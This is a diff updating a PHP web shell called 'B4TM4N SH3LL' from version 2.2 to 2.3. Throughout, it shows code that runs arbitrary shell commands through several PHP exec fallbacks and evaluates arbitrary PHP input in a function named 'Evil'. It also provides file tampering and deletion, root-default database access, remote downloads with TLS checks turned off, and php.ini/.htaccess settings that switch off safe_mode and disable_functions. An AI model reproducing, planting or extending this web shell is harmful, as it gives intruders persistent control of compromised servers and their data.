@@ -14,10 +14,10 @@
 */
 
 $config=[
-	"user"    => "zaIgxSRawZ==",                            // B64E('user')
-	"pass"    => "42b378d7eb719b4ad9c908601bdf290d541c9c3a",// sha1(md5('pass'))
-	"title"   => "B4TM4N SH3LL",                            // Title
-	"version" => "2.2",                                     // Version
+	"user"    => "zaIgxSRawZ==",                             // B64E('user')
+	"pass"    => "42b378d7eb719b4ad9c908601bdf290d541c9c3a", // sha1(md5('pass'))
+	"title"   => "B4TM4N SH3LL",                             // Title
+	"version" => "2.3",                                      // Version
 	"debug"   => true                                        // Debug Mode
 ];
 
@@ -175,14 +175,15 @@ else
 ini_set('max_execution_time','60');
 ini_set('memory_limit','256M');
 
-$userAgent=B64D("FT06ACQoAXYrvHYXMUIMMV5e").$config["version"]; // Powered by B4TM4N/2.0
-$start=microtime(true); // Time Pageload
+$userAgent=B64D("FT06ACQoAXYrvHYXMUIMMV5e").$config["version"]; 	// Powered by B4TM4N
+$title=sprintf('%s - %s',$config['title'],$config['version']);		// Title Page
+$start=microtime(true); 											// Time Pageload
 
 ?><!DOCTYPE html>
 <html>
 <head>
 <title>
-<?=sprintf('%s - %s',$config['title'],$config['version'])?>
+<?=$title?>
 </title>
 <meta name='author' content='k4mpr3t'/>
 <link href="data:image/png;base64,AAABAAEAEBACAAAAAACwAAAAFgAAACgAAAAQAAAAIAAAAAEAAQAAAAAAQAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//wAA//8AAP//AAD//wAA//8AAP7/AAD8fwAAwAcAAMAHAACMYwAADWEAAP//AAD//wAA//8AAP//AAD//wAA" rel="icon" type="image/x-icon" />
@@ -212,6 +213,8 @@ $start=microtime(true); // Time Pageload
 	#database-session{display:inline-block;width:100%}
 	.database-query{float:left;width:49%}
 	.database-process{float:right;width:49%}
+
+	.mail input[type=text]{width:100%;display:block}
 
 	#php{display:inline-block}
 	.php-left{float:left;width:49%}
@@ -249,11 +252,11 @@ $start=microtime(true); // Time Pageload
 
 	.new{margin-right:15px;}
 
-	.hash label{width:100px;display:inline-block}
+	.hash label{min-width:40px;display:inline-block;padding-right:15px}
 	.hash-capture label{margin:10px 0;display:inline-block}
 	.hash input[type=radio]{margin-right:10px;display:inline-block;vertical-align:middle}
 
-	label{display:inline-block;min-width:100px;}
+	label{display:inline-block;min-width:75px;padding-right:15px}
 	iframe{background:#fff}
 
 	.auto-number table{counter-reset:row_}
@@ -285,6 +288,7 @@ $start=microtime(true); // Time Pageload
 	#database{min-height:100px;padding:10px;border-radius:5px}
 	#database label{width:100px;padding:5px;margin-right:10px;display:inline-block}
 	#port-scan label{width:100px;padding:5px;margin-right:10px;display:inline-block}
+	
 	#phpinfo table{margin:25px 0}
 	#phpinfo tr:nth-child(odd){background-color:black}
 	#phpinfo tr:nth-child(even){background-color:#111}
@@ -336,11 +340,14 @@ function dean_addEvent(t,e,r){if(t.addEventListener)t.addEventListener(e,r,!1);e
 <script type="text/javascript">
 	var xhr;
 	window.onload=function(){
-		/* Cursor Focus */
-		if(document.getElementById("terminal-input")!==null) document.getElementById("terminal-input").focus();
-		if(document.getElementById("sourcefocus")!==null) document.getElementById("sourcefocus").focus();
-		if(document.getElementById("php-code")!==null) document.getElementById("php-code").focus();
+		getFocus("terminal-input");
+		getFocus("sourcefocus");
+		getFocus("php-code");
 	};
+	function getFocus(id){
+		if(document.getElementById(id)!==null){
+		document.getElementById(id).focus();}
+	}
 	function getAjax(txt,id,method,url){
 		var xmlhttp;
 		if(txt){document.getElementById(id).innerHTML="Please Wait... <div class='loading'></div>";
@@ -349,14 +356,12 @@ function dean_addEvent(t,e,r){if(t.addEventListener)t.addEventListener(e,r,!1);e
 		}else{xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");}
 		xhr=xmlhttp;
 		xmlhttp.onreadystatechange=function(){
-			if(xmlhttp.readyState==4&&xmlhttp.status==200){
-				if(txt){document.getElementById(id).innerHTML=xmlhttp.responseText;
-				}else{document.getElementById(id).value=xmlhttp.responseText;}
-			}else if(xmlhttp.readyState==4&&xmlhttp.status!=200){
-				if(txt){document.getElementById(id).innerHTML="Error";
-				}else{document.getElementById(id).value="Error";}
-			}
-		};
+		if(xmlhttp.readyState==4&&xmlhttp.status==200){
+		if(txt){document.getElementById(id).innerHTML=xmlhttp.responseText;
+		}else{document.getElementById(id).value=xmlhttp.responseText;}
+		}else if(xmlhttp.readyState==4&&xmlhttp.status!=200){
+		if(txt){document.getElementById(id).innerHTML="Error";
+		}else{document.getElementById(id).value="Error";}}};
 		xmlhttp.open(method,url,true);
 		xmlhttp.send();
 	}
@@ -367,39 +372,31 @@ function dean_addEvent(t,e,r){if(t.addEventListener)t.addEventListener(e,r,!1);e
 	}
 	function checkAll(){
 		for(var i=0;i<document.getElementsByName('chk[]').length;i++){
-			document.getElementsByName('chk[]')[i].checked=document.getElementsByName('check-all')[0].checked;	
-		}
+		document.getElementsByName('chk[]')[i].checked=document.getElementsByName('check-all')[0].checked;}
 	}
 	function checkCount(id){
 		count=1;
 		for(var i=0;i<document.getElementsByName('chk[]').length;i++){
-			if(document.getElementsByName('chk[]')[i].checked){
-				document.getElementById(id).innerHTML=count++;
-			}else{
-				document.getElementById(id).innerHTML=count-1;
-			}
-		}
+		if(document.getElementsByName('chk[]')[i].checked){
+		document.getElementById(id).innerHTML=count++;
+		}else{document.getElementById(id).innerHTML=count-1;}}
 	}
 	function mapSwitch(id,id2){
 		var a=document.getElementById(id);
 		var b=document.getElementById(id2);
 		if(a.style.display=='inline-block'){
-			a.style.display='none';
-			b.style.display='inline-block';
-		}else{
-			a.style.display='inline-block';
-			b.style.display='none';
-		}
+		a.style.display='none';
+		b.style.display='inline-block';
+		}else{a.style.display='inline-block';
+		b.style.display='none';}
 	}
-	function getParameter(paramName) {
+	function getParameter(p) {
 		var searchString=window.location.search.substring(1),
 		i,val,params=searchString.split("&");
-		for (i=0;i<params.length;i++) {
-			val=params[i].split("=");
-			if (val[0]==paramName) {
-				return val[1];
-			}
-		}
+		for(i=0;i<params.length;i++){
+		val=params[i].split("=");
+		if(val[0]==p){
+		return val[1];}}
 		return null;
 	}
 </script>
@@ -417,12 +414,12 @@ function Unix()
 
 function Evil($x)
 {
-	$response=@eval($x);
+	$evil=@eval($x);
 	if(error_get_last())
 	{
 	    return print_r(error_get_last());
 	}
-	return $response;
+	return $evil;
 }
 
 function Execute($x)
@@ -434,35 +431,38 @@ function Execute($x)
 	}
 	elseif(function_exists('system'))
 	{
-		ob_start();		
-		$system=system($x);		
-		$buff=ob_get_contents();		
+		ob_start();
+		$system=system($x);
+		$buff=ob_get_contents();
 		ob_end_clean();
 		return $buff;
 	}
 	elseif(function_exists('exec'))
 	{
 		$buff="";
-		exec($x,$results);		
-		foreach($results as $result){$buff.=$result;}
+		exec($x,$results);
+		foreach($results as $result)
+		{
+			$buff.=$result;
+		}
 		return $buff;
 	}
 	elseif(function_exists('shell_exec'))
 	{
-		$buff=shell_exec($x);	
+		$buff=shell_exec($x);
 		return $buff;
 	}
 	elseif(function_exists('pcntl_exec'))
 	{
-		$buff=pcntl_exec($x);	
+		$buff=pcntl_exec($x);
 		return $buff;
 	}
 	elseif(function_exists('passthru'))
 	{
 		ob_start();		
 		$passthru=passthru($x);
-		$buff=ob_get_contents();		
-		ob_end_clean();		
+		$buff=ob_get_contents();
+		ob_end_clean();	
 		return $buff;
 	}
 	elseif(function_exists('proc_open'))
@@ -479,7 +479,10 @@ function Execute($x)
 	{
 		$buff="";
 		$pop=popen($x,"r");
-		while(!feof($pop)){$buff.=fread($pop,1024);}
+		while(!feof($pop))
+		{
+			$buff.=fread($pop,1024);
+		}
 		pclose($pop);
 		return $buff;
 	}
@@ -569,13 +572,14 @@ function GetDownloadUrl($x,$y)
 	$fl=fopen($y,"w");
 	$ch=curl_init();
 	curl_setopt($ch,CURLOPT_USERAGENT,$userAgent);
-	curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);
-	curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
 	curl_setopt($ch,CURLOPT_URL,$x);
 	curl_setopt($ch,CURLOPT_FILE,$fl);
 	curl_setopt($ch,CURLOPT_HEADER,0);
+	curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);
+	curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
 	curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
 	$rs=curl_exec($ch);
+	if(curl_error($ch)) return curl_error($ch);
 	curl_close($ch);
 	fclose($fl);
 	return true;
@@ -592,6 +596,7 @@ function GetUrlExists($x)
 	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
 	$rs=curl_exec($ch);
 	$http=curl_getinfo($ch,CURLINFO_HTTP_CODE);
+	if(curl_error($ch)) return curl_error($ch);
 	curl_close($ch);
 	return ($http>=200 && $http<300);
 }
@@ -601,13 +606,14 @@ function GetUrlContent($x)
 	global $userAgent;
 	$ch=curl_init();
 	curl_setopt($ch,CURLOPT_USERAGENT,$userAgent);
+	curl_setopt($ch,CURLOPT_URL,$x);
+	curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);
 	curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
 	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
-	curl_setopt($ch,CURLOPT_URL,$x);
 	$rs=curl_exec($ch);
+	if(curl_error($ch)) return curl_error($ch);
 	curl_close($ch);
 	return $rs;
-	//$rs=file_get_contents($url);
 }
 
 function GetUrlFromPath($x)
@@ -673,15 +679,8 @@ function PostUrlContent($url,$content)
 function GetFileType($x) 
 {
 	if(is_file($x)) 
-	{ 
-		if (strpos($x,'.'))
-		{
-			return end(explode(".",$x));
-		}
-		else
-		{
-			return end(explode(_,$x));
-		}
+	{
+		return end(explode(".",end(explode(_,$x))));
 	}
 	elseif(is_dir($x)) 
 	{ 
@@ -787,6 +786,19 @@ function GetFileOwnerGroup($x)
 	return "?(?)/?(?)";
 }
 
+function GetSafeMode() 
+{
+	if(ini_get("safe_mode")=='on') 
+	{
+		$safemod="<font class='off'>ON</font>";
+	}
+	else
+	{
+		$safemod="<font class='on'>OFF</font>";
+	}
+	return $safemod;
+}
+
 function MapDirectory($x) 
 {
 	$map="";
@@ -841,7 +853,7 @@ function MapDrive($x)
 				$l.="<a href=\"?d=".urle($lt.":\\")."\">[";
 				if(strtolower($lt.':')!=strtolower($v)) 
 				{
-					$l.=$lt ;
+					$l.=$lt;
 				}
 				else
 				{
@@ -852,34 +864,6 @@ function MapDrive($x)
 		}
 		return $l;
 	}
-}
-
-function MenuTools($x) 
-{
-	global $menu_tools;
-	$ol="<div class='menu-tools'><ul>";
-	$menu_tools=$x;
-	
-	foreach($menu_tools as $k => $v)
-	{
-		$active=$_REQUEST['z']==$k?"class='active'":"";
-		$ol.="<li><a ".$active." href='?z=".$k."'>[".$v['title']."]</a></li>" ;
-	}
-	$ol.="</ul></div>";
-	return $ol;
-}
-
-function GetSafeMode() 
-{
-	if(ini_get("safe_mode")=='on') 
-	{
-		$safemod="<font class='off'>ON</font>";
-	}
-	else
-	{
-		$safemod="<font class='on'>OFF</font>";
-	}
-	return $safemod;
 }
 
 function MainMenu() 
@@ -901,24 +885,39 @@ function MainMenu()
 		"&#9819; Tools" => "?z",
 		"Account"       => "?x=account",
 		"Update"        => "?x=update",
-		"logout"        => "?x=logout"
+		"Logout"        => "?x=logout"
 	];
 	$nu="";
-	foreach($menu as $val => $key)
+	foreach($menu as $key => $val)
 	{
-		$idxkey=substr($key,1,1);
-		$idxval=substr($key,3);
+		$idxkey=substr($val,1,1);
+		$idxval=substr($val,3);
 		$active=any($idxkey,$_REQUEST)&&$_REQUEST[$idxkey]==$idxval?"class='active'":"";
-		if($val=="logout")
+		if($key=="Logout")
 		{
-			$nu.="<li><a ".$active." href='".$key."' onclick=\"return confirm('Bye !');\">".$val."</a></li>" ;
+			$nu.="<li><a ".$active." href='".$val."' onclick=\"return confirm('Bye !');\">".$key."</a></li>";
 		}
 		else
 		{
-			$nu.="<li><a ".$active." href='".$key."'>".$val."</a></li>" ;
+			$nu.="<li><a ".$active." href='".$val."'>".$key."</a></li>";
 		}
 	}
 	return $nu;
+}
+
+function MenuTools($x) 
+{
+	global $menu_tools;
+	$ol="<div class='menu-tools'><ul>";
+	$menu_tools=$x;
+	
+	foreach($menu_tools as $k => $v)
+	{
+		$active=$_REQUEST['z']==$k?"class='active'":"";
+		$ol.="<li><a ".$active." href='?z=".$k."'>[".$v['title']."]</a></li>";
+	}
+	$ol.="</ul></div>";
+	return $ol;
 }
 
 printf("<div id='header'>
@@ -1041,7 +1040,7 @@ if(any("d",$_REQUEST)||request_uri==script_name)
 
 		while(false!==($file=readdir($handle)))
 		{
-			$filedir=$dir._.$file;
+			$filedir=rtrim($dir,_)._.$file;
 			$updir=substr($dir,0,strrpos($dir,_));
 			if (strlen($updir)<=2) $updir=$updir._;
 			$type=GetFileType($filedir);
@@ -1049,6 +1048,26 @@ if(any("d",$_REQUEST)||request_uri==script_name)
 			$last=GetFileTime($filedir,"modify");
 			$perm=GetFilePerm($filedir);
 			$owner=GetOwnerGroup($filedir);
+			$mime=@mime_content_type($filedir);
+			$view="";
+
+			if(strpos($mime,'image')!==false)
+			{
+				$view="?a=v&w=i&r=".urle($filedir);
+			}
+			elseif(strpos($mime,'video')!==false)
+			{
+				$view="?a=v&w=v&r=".urle($filedir);
+			}
+			elseif(strpos($mime,'audio')!==false)
+			{
+				$view="?a=v&w=a&r=".urle($filedir);
+			}
+			else
+			{
+				$view="?a=v&r=".urle($filedir);
+			}
+			
 			if($file==".")
 			{
 				$reads[]="<tr sorttable_customkey='2'><td><center><input type='checkbox' name='nochk[]' value='".urle($dir)."'/></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAd5JREFUeNqMU79rFUEQ/vbuodFEEkzAImBpkUabFP4ldpaJhZXYm/RiZWsv/hkWFglBUyTIgyAIIfgIRjHv3r39MePM7N3LcbxAFvZ2b2bn22/mm3XMjF+HL3YW7q28YSIw8mBKoBihhhgCsoORot9d3/ywg3YowMXwNde/PzGnk2vn6PitrT+/PGeNaecg4+qNY3D43vy16A5wDDd4Aqg/ngmrjl/GoN0U5V1QquHQG3q+TPDVhVwyBffcmQGJmSVfyZk7R3SngI4JKfwDJ2+05zIg8gbiereTZRHhJ5KCMOwDFLjhoBTn2g0ghagfKeIYJDPFyibJVBtTREwq60SpYvh5++PpwatHsxSm9QRLSQpEVSd7/TYJUb49TX7gztpjjEffnoVw66+Ytovs14Yp7HaKmUXeX9rKUoMoLNW3srqI5fWn8JejrVkK0QcrkFLOgS39yoKUQe292WJ1guUHG8K2o8K00oO1BTvXoW4yasclUTgZYJY9aFNfAThX5CZRmczAV52oAPoupHhWRIUUAOoyUIlYVaAa/VbLbyiZUiyFbjQFNwiZQSGl4IDy9sO5Wrty0QLKhdZPxmgGcDo8ejn+c/6eiK9poz15Kw7Dr/vN/z6W7q++091/AQYA5mZ8GYJ9K0AAAAAASUVORK5CYII='/> <a title='Current Directory' href='?d=".urle($dir)."'>.</a></td><td><center>".$type."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=x&r=".urle($dir)."' onclick=\"return confirm('Delete It ?');\" title='Delete Folder'>&#10008;</a> <a class='action' href='?a=c&r=".urle($dir)."' title='Modify Folder'>&#8499;</a></td></tr>";
@@ -1066,7 +1085,7 @@ if(any("d",$_REQUEST)||request_uri==script_name)
 				}
 				else
 				{
-					$reads[]="<tr sorttable_customkey='4'><td><center><input type='checkbox' name='chk[]' value='".urle($filedir)."' /></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAABnRSTlMAAAAAAABupgeRAAABHUlEQVR42o2RMW7DIBiF3498iHRJD5JKHurL+CRVBp+i2T16tTynF2gO0KSb5ZrBBl4HHDBuK/WXACH4eO9/CAAAbdvijzLGNE1TVZXfZuHg6XCAQESAZXbOKaXO57eiKG6ft9PrKQIkCQqFoIiQFBGlFIB5nvM8t9aOX2Nd18oDzjnPgCDpn/BH4zh2XZdlWVmWiUK4IgCBoFMUz9eP6zRN75cLgEQhcmTQIbl72O0f9865qLAAsURAAgKBJKEtgLXWvyjLuFsThCSstb8rBCaAQhDYWgIZ7myM+TUBjDHrHlZcbMYYk34cN0YSLcgS+wL0fe9TXDMbY33fR2AYBvyQ8L0Gk8MwREBrTfKe4TpTzwhArXWi8HI84h/1DfwI5mhxJamFAAAAAElFTkSuQmCC'> <a title='View File' href='?a=v&r=".urle($filedir)."'>".$file."</a></td><td><center>".$type."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=e&r=".urle($filedir)."' title='Modify File'>&#8499;</a> <a class='action' href='?a=x&r=".urle($filedir)."' onclick=\"return confirm('Delete It ?');\" title='Delete File'>&#10008;</a> <a class='action' href='?a=d&r=".urle($filedir)."' title='Download File'>&#10149;</a></td></tr>";		
+					$reads[]="<tr sorttable_customkey='4'><td><center><input type='checkbox' name='chk[]' value='".urle($filedir)."' /></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAABnRSTlMAAAAAAABupgeRAAABHUlEQVR42o2RMW7DIBiF3498iHRJD5JKHurL+CRVBp+i2T16tTynF2gO0KSb5ZrBBl4HHDBuK/WXACH4eO9/CAAAbdvijzLGNE1TVZXfZuHg6XCAQESAZXbOKaXO57eiKG6ft9PrKQIkCQqFoIiQFBGlFIB5nvM8t9aOX2Nd18oDzjnPgCDpn/BH4zh2XZdlWVmWiUK4IgCBoFMUz9eP6zRN75cLgEQhcmTQIbl72O0f9865qLAAsURAAgKBJKEtgLXWvyjLuFsThCSstb8rBCaAQhDYWgIZ7myM+TUBjDHrHlZcbMYYk34cN0YSLcgS+wL0fe9TXDMbY33fR2AYBvyQ8L0Gk8MwREBrTfKe4TpTzwhArXWi8HI84h/1DfwI5mhxJamFAAAAAElFTkSuQmCC'> <a title='View File' href='".$view."'>".$file."</a></td><td><center>".$type."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=e&r=".urle($filedir)."' title='Modify File'>&#8499;</a> <a class='action' href='?a=x&r=".urle($filedir)."' onclick=\"return confirm('Delete It ?');\" title='Delete File'>&#10008;</a> <a class='action' href='?a=d&r=".urle($filedir)."' title='Download File'>&#10149;</a></td></tr>";		
 					$count_files++;
 				}
 			}
@@ -1183,46 +1202,61 @@ if(any("r",$_REQUEST))
 
 	if(is_file($file)||is_link($file))
 	{
-		printf("<div class='menu'>
-					<ul>
-						<li><a href='%s'>Back</a></li>
-						<li><a href='?a=e&r=%s'>Edit</a></li>
-						<li><a href='?a=v&r=%s'>View</a></li>
-						<li><a href='?a=cp&r=%s'>Copy</a></li>
-						<li><a href='?a=mv&r=%s'>Move</a></li>
-						<li><a href='?a=d&r=%s'>Download</a></li>
-						<li><a href='?a=h&r=%s'>Hexdump</a></li>
-						<li><a href='?a=c&r=%s'>Chmod</a></li>
-						<li><a href='?a=cwn&r=%s'>Chown</a></li>
-						<li><a href='?a=cgp&r=%s'>Chgrp</a></li>
-						<li><a href='?a=t&r=%s'>Touch</a></li>
-						<li><a href='?a=r&r=%s'>Rename</a></li>
-						<li><a href='?a=x&r=%s' onclick=\"return confirm('Delete It ?');\">Delete</a></li>
-					</ul>
-				</div>",
-				$back,urle($file),
-				urle($file),urle($file),urle($file),
-				urle($file),urle($file),urle($file),
-				urle($file),urle($file),urle($file),
-				urle($file),urle($file),urle($file)
-		);
+		$menu=[
+
+			"Back"      => "?a=b&r=",
+			"Edit"      => "?a=e&r=",
+			"View"      => "?a=v&r=",
+			"Copy"      => "?a=cp&r=",
+			"Move"      => "?a=mv&r=",
+			"Download"  => "?a=d&r=",
+			"Hexdump"   => "?a=h&r=",
+			"Chmod"     => "?a=c&r=",
+			"Chown"     => "?a=cwn&r=",
+			"Chgrp"     => "?a=cgp&r=",
+			"Touch"     => "?a=t&r=",
+			"Rename"    => "?a=r&r=",
+			"Delete"    => "?a=x&r="
+		];
 	}
 	elseif(is_dir($file))
 	{
-		printf("<div class='menu'>
-					<ul>
-						<li><a href='%s'>Back</a></li>
-						<li><a href='?a=c&r=%s'>Chmod</a></li>
-						<li><a href='?a=r&r=%s'>Rename</a></li>
-						<li><a href='?a=t&r=%s'>Touch</a></li>
-						<li><a href='?a=x&r=%s' onclick=\"return confirm('Delete It ?');\">Delete</a></li>
-					</ul>
-				</div>",
-				$back,
-				urle($file),urle($file),
-				urle($file),urle($file)
-		);
+		$menu=[
+
+			"Back"      => "?a=b&r=",
+			"Chmod"     => "?a=c&r=",
+			"Chown"     => "?a=cwn&r=",
+			"Chgrp"     => "?a=cgp&r=",
+			"Touch"     => "?a=t&r=",
+			"Rename"    => "?a=r&r=",
+			"Delete"    => "?a=x&r="
+		];
 	}
+
+	$nu="";
+	
+	foreach($menu as $key => $val)
+	{
+		$idxkey=substr($val,1,1);
+		$idxval=substr($val,3,strpos($val,'&')-3);
+		$active=any($idxkey,$_REQUEST)&&$_REQUEST[$idxkey]==$idxval?"class='active'":"";
+		if($key=="Delete")
+		{
+			$nu.="<li><a ".$active." href='".$val.urle($file)."' onclick=\"return confirm('Sure !?');\">".$key."</a></li>";
+		}
+		elseif($key=="Back")
+		{
+			$nu.="<li><a ".$active." href='".$back."'>".$key."</a></li>";
+		}
+		else
+		{
+			$nu.="<li><a ".$active." href='".$val.urle($file)."'>".$key."</a></li>";
+		}
+	}
+
+	printf("<div class='menu'>
+		<ul>%s</ul>
+	</div>",$nu);
 
 	if($_REQUEST['a']=='e')
 	{
@@ -1258,8 +1292,8 @@ if(any("r",$_REQUEST))
 		{
 			$new_source=$_REQUEST['sourcecode'];
 			if(function_exists("chmod")) chmod($file,0755);
-			$source_edit=fopen($file,'wb+');
-			$tulis=fputs($source_edit,$new_source);
+			$source_edit=fopen($file,'w+');
+			$tulis=fwrite($source_edit,$new_source);
 			fclose($source_edit);
 			if($tulis)
 			{
@@ -1810,23 +1844,25 @@ if(any("x",$_REQUEST))
 		{
 			printf("<div id='database'>
 					<form action='?x=db&xa=db' method='post' class='new'><br>
-						<label>Host</label><input type='text' name='host' value='%s'/><br>
+						<label>Host</label><input type='text' name='host' value='localhost'/><br>
 						<label>Port</label><input type='text' name='port' value='3306'/><br>
 						<label>Username</label><input type='text' name='user' value='root'/><br>
 						<label>Password</label><input type='text' name='pass' value=''/><br>
+						<label>Database</label><input type='text' name='db' value=''/><br>
 						<input type='submit' value='Connect'/>
 					</form>
-				</div>",gethostbyname(http_host));
+				</div>");
 		}
 
 		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="db")
 		{	
-			$cn=@mysqli_connect($_REQUEST['host'],$_REQUEST['user'],$_REQUEST['pass'],null,$_REQUEST['port']);
+			$cn=mysqli_connect($_REQUEST['host'],$_REQUEST['user'],$_REQUEST['pass'],$_REQUEST['db'],$_REQUEST['port']);
 
 			$_SESSION['host']=$_REQUEST['host'];
 			$_SESSION['port']=$_REQUEST['port'];
 			$_SESSION['user']=$_REQUEST['user'];
 			$_SESSION['pass']=$_REQUEST['pass'];
+			$_SESSION['db']=$_REQUEST['db'];
 
 			if($cn)
 			{
@@ -1843,7 +1879,7 @@ if(any("x",$_REQUEST))
 		if(any("q",$_REQUEST)&&$_REQUEST['q']=="db")
 		{
 			$_SESSION['status']='';
-			$sql=@mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],null,$_SESSION['port']);
+			$sql=mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],$_SESSION['db'],$_SESSION['port']);
 
 			if(isset($_REQUEST['disconnect']))
 			{
@@ -1858,12 +1894,12 @@ if(any("x",$_REQUEST))
 
 			$data=[];
 			$query=!empty($_REQUEST['query'])?$_REQUEST['query']:'show databases;';
-			$result=@mysqli_query($sql,$query);
+			$result=mysqli_query($sql,$query);
 			$_SESSION['query']=$_REQUEST['query'];
 			
 			if($result)
 			{
-				while($row=@mysqli_fetch_row($result))
+				while($row=mysqli_fetch_row($result))
 				{
 					$data[]=$row;
 				}
@@ -1875,7 +1911,7 @@ if(any("x",$_REQUEST))
 
 			if ($data!==false)
 			{
-				print "<table class='table'>";
+				print "<div class='auto-number'><table class='table'>";
 				foreach($data as $key => $val)
 				{
 					if(is_array($val))
@@ -1885,14 +1921,14 @@ if(any("x",$_REQUEST))
 						{
 							if(!is_array($val2))
 							{
-								print "<td>".$val2."</td>";
+								print "<td width='15'></td><td>".$val2."</td>";
 							}
 						}
 						print "</tr>";
 					}
 					
 				}
-				print "</table>";
+				print "</table></div>";
 			}
 			else
 			{
@@ -1946,7 +1982,7 @@ if(any("x",$_REQUEST))
 			                    {
 			                        $row[$j]=addslashes($row[$j]);
 			                        $row[$j]=preg_replace("#\n#","\\n",$row[$j]);
-			                        if (isset($row[$j])) { $return.='"'.$row[$j].'"' ;} else { $return.='""';}
+			                        if (isset($row[$j])) { $return.='"'.$row[$j].'"';} else { $return.='""';}
 			                        if ($j<($num_fields-1)) { $return.=',';}
 			                   }
 			                    if (++$i_row==$num_rows) {
@@ -2149,14 +2185,34 @@ if(any("x",$_REQUEST))
 	}
 	if($_REQUEST['x']=="htaccess")
 	{
-		$php_ini="upload_max_filesize=32M\npost_max_size=32M\nsafe_mode=Off\ndisable_functions =\nsafe_mode_gid=Off\nopen_basedir=Off\nregister_globals=on\nexec=On\nshell_exec=On";
-		$htaccess="Options All\nAllow From All\nSatisfy Any";
+		$php_ini=[
+			"php_value upload_max_filesize 32M",
+			"php_value post_max_size 32M",
+			"php_flag safe_mode Off",
+			"php_value disable_functions null",
+			"php_flag safe_mode_gid Off",
+			"php_value open_basedir $dir",
+			"php_flag register_globals On",
+			"php_flag exec On",
+			"php_flag shell_exec On"];
 
-		print "Coming Soon";
+		$htaccess=[
+			"Options All",
+			"Allow From All",
+			"Satisfy Any"];
+
+		printf("<textarea>%s</textarea>",implode($php_ini,"\n"));
 	}
 	if($_REQUEST['x']=="php")
 	{	
-		$exp="print_r(get_extension_funcs('Core'));\nprint_r(get_loaded_extensions());\nprint_r(ini_get_all('pcre'));\nprint_r(ini_get_all());\nprint_r(get_defined_constants());\nprint_r(get_defined_functions());\nprint_r(get_declared_classes());";
+		$exp=[
+			"print_r(get_extension_funcs('Core'));",
+			"print_r(get_loaded_extensions());",
+			"print_r(ini_get_all('pcre'));",
+			"print_r(ini_get_all());",
+			"print_r(get_defined_constants());",
+			"print_r(get_defined_functions());",
+			"print_r(get_declared_classes());"];
 		
 		printf("<div id='php'>
 					<form onsubmit='return false;'>
@@ -2168,12 +2224,13 @@ if(any("x",$_REQUEST))
 						</div>
 						<input type='submit' id='php-submit' onclick=\"getAjax(false,'php-eval','POST','?x=php&code='+document.getElementById('php-code').value);\" class='php-code' name=php-code cols=122 rows=20 value=Run />
 					</form>
-				</div>",$exp);
+				</div>",implode($exp,"\n"));
 
 		if(any("code",$_REQUEST))
 		{
 			ob_clean();
-			$evil=Evil(trim($_REQUEST['code']));
+			$code=trim($_REQUEST['code']);
+			$evil=Evil($code);
 			exit;
 		}
 	}
@@ -2189,7 +2246,7 @@ if(any("x",$_REQUEST))
 			}
 			else
 			{
-				$path_perl="/usr/bin/env";
+				$path_perl="/usr/bin/env perl";
 			}
 		}
 		else
@@ -2208,11 +2265,26 @@ if(any("x",$_REQUEST))
 			}
 		}
 		
-		$script="#!$path_perl\nuse strict;\nuse warnings;\nuse CGI;\nprint CGI::header();\nprint \"k4mpr3t on CGI\";";
-		$htaccess="Options +ExecCGI\nAddType application/x-httpd-cgi .ler\nAddHandler cgi-script .ler";
+		$script=[
+			"#!$path_perl",
+			"use strict;",
+			"use warnings;",
+			"use CGI;",
+			"print CGI::header();",
+			"print 'k4mpr3t on CGI';"];
+
+		$htaccess=[
+			"Options +ExecCGI +SymLinksIfOwnerMatch",
+			"DirectoryIndex index.ler",
+			"AddType application/x-httpd-cgi .ler",
+			"AddHandler cgi-script .ler"];
+
 		$path=$dir._.'cgi-bin';
-		$file=$path._.'index.ler';
+		$file=$path._.'perl.ler';
 		$file2=$path._.'.htaccess';
+
+		$scripts=implode($script,"\n");
+		$htaccesss=implode($htaccess,"\n");
 
 		if(!is_dir($path))
 		{
@@ -2220,15 +2292,15 @@ if(any("x",$_REQUEST))
 		}
 		if(!is_file($file))
 		{
-			$op=fopen($file,'wb+');
-			fputs($op,$script);
+			$op=fopen($file,'w+');
+			fwrite($op,$scripts);
 			fclose($op);
 			chmod($file,0755);
 		}
 		if(!is_file($file2))
 		{
-			$op=fopen($file2,'wb+');
-			fputs($op,$htaccess);
+			$op=fopen($file2,'w+');
+			fwrite($op,$htaccesss);
 			fclose($op);
 			chmod($file2,0755);
 		}
@@ -2251,42 +2323,109 @@ if(any("x",$_REQUEST))
 	}
 	if($_REQUEST['x']=="mail")
 	{
+		printf("
 
-		$to='johny@example.com,sally@example.com';
-		$subject='Birthday Reminders for August';
+			<div class='divide'>
+				<div class='divide-left'>
+					<fieldset>
+						<legend>Mail</legend>
+						<form onsubmit='return false;' class='mail'>
